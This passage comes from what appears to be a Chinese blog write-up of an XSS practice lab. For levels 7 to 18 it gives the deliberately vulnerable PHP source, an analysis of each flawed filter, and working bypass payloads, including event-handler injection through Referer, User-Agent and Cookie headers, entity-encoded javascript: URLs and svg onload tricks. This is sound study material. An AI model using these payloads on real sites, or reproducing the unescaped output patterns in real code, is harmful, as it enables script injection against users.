class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>替换了一系列关键字，但是却替换为空值，所以可以利用双写绕过</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="属性值编码绕过"><a href="#属性值编码绕过" class="headerlink" title="属性值编码绕过"></a>属性值编码绕过</h3><p>这关有点不一样了</p><p><img src="/2019/05/20/XSS挑战之旅/1558105893509.png" alt="1558105893509"></p><p>试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558106118797.png" alt="1558106118797"></p><p>script和href被替换，再尝试on、src、<code>&quot;</code> 都会被替换，大小写也无法绕过</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第一处有html实体化转义，无法逃脱出来。第二处先转换大小写，然后黑名单过滤特殊字符和双引号；参考别人的文章，发现可以对HTML属性的值进行实体编码绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558237810579.png" alt="1558237810579"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="格式验证绕过"><a href="#格式验证绕过" class="headerlink" title="格式验证绕过"></a>格式验证绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558248807926.png" alt="1558248807926"></p><p>提示链接不合法，应该是验证了链接的格式，输入<code>http://</code> 能成功写入</p><p><img src="/2019/05/20/XSS挑战之旅/1558248919987.png" alt="1558248919987"></p><p>那就继续构造带 <code>http://</code> 的拼接语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558249256987.png" alt="1558249256987"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>可以看出与level8的区别就在于多加了一个链接格式的判断，使用strpos()函数，查找<code>http://</code>出现的位置，但是改代码没有判断位置是否在开头，仅判断被查找的字符串即 <code>http://</code> 是否存在，所以可以在payload后面加上注释符和<code>http://</code>，即可成功绕过</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="隐藏GET传参"><a href="#隐藏GET传参" class="headerlink" title="隐藏GET传参"></a>隐藏GET传参</h3><p>这关发现一个隐藏的表单</p><p><img src="/2019/05/20/XSS挑战之旅/1558250497766.png" alt="1558250497766"></p><p>但是没有提交按钮和提交页面</p><p><img src="/2019/05/20/XSS挑战之旅/1558250601339.png" alt="1558250601339"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>发现GET参数<code>t_sort</code>会被过滤<code>&lt;&gt;</code>输出，所以可以使用事件属性进行构造利用</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558251116826.png" alt="1558251116826"></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Referer头插入"><a href="#Referer头插入" class="headerlink" title="Referer头插入"></a>Referer头插入</h3><p>隐藏表单多了一个<code>&lt;input&gt;</code></p><p><img src="/2019/05/20/XSS挑战之旅/1558251262671.png" alt="1558251262671"></p><p>把全部表单的值通过GET参数传递过去</p><p><img src="/2019/05/20/XSS挑战之旅/1558251563250.png" alt="1558251563250"></p><p><img src="/2019/05/20/XSS挑战之旅/1558251601685.png" alt="1558251601685"></p><p>只有t_sort接收了get传参，看起来双引号被转义掉了，尝试了单引号也不行，又尝试了POST传参也不行</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>和上一关的代码类似，但是<code>t_sort</code>的值经过了html实体化转义，所以无法在此处进行利用了。不过新的<code>t_ref</code>，的值是通过referer头获取的，可以抓包修改Referer头的内容，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558252521803.png" alt="1558252521803"></p><p>总结：</p><p>要注意细节，寻找提示信息，不放过任何一处我们提交的数据内容</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UA头插入"><a href="#UA头插入" class="headerlink" title="UA头插入"></a>UA头插入</h3><p>在页面源码中发现User-Agent信息</p><p><img src="/2019/05/20/XSS挑战之旅/1558252884442.png" alt="1558252884442"></p><p>修改UA头部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558253045262.png" alt="1558253045262"></p><p><img src="/2019/05/20/XSS挑战之旅/1558253074469.png" alt="1558253074469"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟上一关一样，区别就在于获取的请求头部信息变成了<code>User-Agent</code>，所以只需要抓包修改UA的内容即可</p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookie插入"><a href="#Cookie插入" class="headerlink" title="Cookie插入"></a>Cookie插入</h3><p>注意到cookie参数</p><p><img src="/2019/05/20/XSS挑战之旅/1558253383778.png" alt="1558253383778"></p><p>查看cookie内容</p><p><img src="/2019/05/20/XSS挑战之旅/1558253574394.png" alt="1558253574394"></p><p>修改cookie，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558253654942.png" alt="1558253654942"></p><p>成功触发XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟之前一样，区别就在于获取的请求头部信息换成了获取cookie中的<code>user</code>的值，所以把cookie中user的值里插入payload即可</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>这关使用<code>&lt;iframe&gt;</code>嵌入了一个小网页（注意：需要访问到<code>外网</code>才能访问）</p><p><img src="/2019/05/20/XSS挑战之旅/1558254716646.png" alt="1558254716646"></p><p>发现搜索框有输出点</p><p><img src="/2019/05/20/XSS挑战之旅/1558254944255.png" alt="1558254944255"></p><p>尝试闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558255107617.png" alt="1558255107617"></p><p><img src="/2019/05/20/XSS挑战之旅/1558255149283.png" alt="1558255149283"></p><p>&lt;&gt;被转义掉了，感觉这里不存在可利用的点了。</p><p>看下源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有一个iframe标签引用了<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>，最后看了下<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知上的wp</a>，了解到这关考察的是exif xss，漏洞原理是通过修改图片的exif信息，造成解析图片exif触发XSS。</p><p><img src="/2019/05/20/XSS挑战之旅/1558360067701.png" alt="1558360067701"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558358694058.png" alt="1558358694058"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="文件包含插入"><a href="#文件包含插入" class="headerlink" title="文件包含插入"></a>文件包含插入</h3><p><img src="/2019/05/20/XSS挑战之旅/1558265228176.png" alt="1558265228176"></p><p>先试了一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558266783744.png" alt="1558266783744"></p><p><code>&lt;&gt;</code>被转义掉了，再试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558266984431.png" alt="1558266984431"></p><p>双引号也被转义掉了，一时没了思路，看了下网上的文章，说是要注意下面这里</p><p><img src="/2019/05/20/XSS挑战之旅/1558267117962.png" alt="1558267117962"></p><p>上网查了一下相关知识</p><p><img src="/2019/05/20/XSS挑战之旅/1558265795045.png" alt="1558265795045"></p><p>发现ng-include可以利用，因为不能跨域，所以包含一个前面的关卡，<code>&lt;script&gt;</code>没有成功，使用<code>&lt;img&gt;</code>成功触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558266253831.png" alt="1558266253831"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>此处只有一个输出点，被实体化转义过了，也不是单引号闭合，所以无法逃逸，只能从<code>ng-include</code>处入手了。</p><p>还有一点疑问，我们的payload明明被实体化转义掉了，为什么还可以再原样输出回来呢？</p><p>总结：</p><p>发现不一样，不了解的点时，多去查查相关资料，不能错过知识点外的机会。</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558267796468.png" alt="1558267796468"></p><p>尝试<code>&lt;script&gt;</code>标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558268014317.png" alt="1558268014317"></p><p><code>script</code> 和 <code>/</code> 替换为空，试一下<code>svg</code></p><p><img src="/2019/05/20/XSS挑战之旅/1558268343632.png" alt="1558268343632">发现只有空格被过滤掉，使用<code>%0a</code> <code>%0d</code>做分隔符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558268510194.png" alt="1558268510194"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>只是对空格，<code>script</code>，<code>/</code> 进行了过滤，不使用<code>script</code>，并且用其他方式代替空格即可成功绕过。</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="属性空格逃逸"><a href="#属性空格逃逸" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p><img src="/2019/05/20/XSS挑战之旅/1558273349908.png" alt="1558273349908"></p><p>可以看到可控的参数有两个，试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558273500807.png" alt="1558273500807"></p><p><code>&lt;&gt;</code>，<code>&quot;</code>被过滤，最后试出来个哈哈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558273987115.png" alt="1558273987115"></p><p>那这样应该也能行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558274123391.png" alt="1558274123391"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>虽然参数都加上了实体化转义，但是没有引号闭合属性，所以添加空格就可以写个新属性啦哈哈</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="属性空格逃逸-1"><a href="#属性空格逃逸-1" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p>Excuse me ???，上把的payload都没变</p><p><img src="/2019/05/20/XSS挑战之旅/1558274541848.png" alt="1558274541848"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span 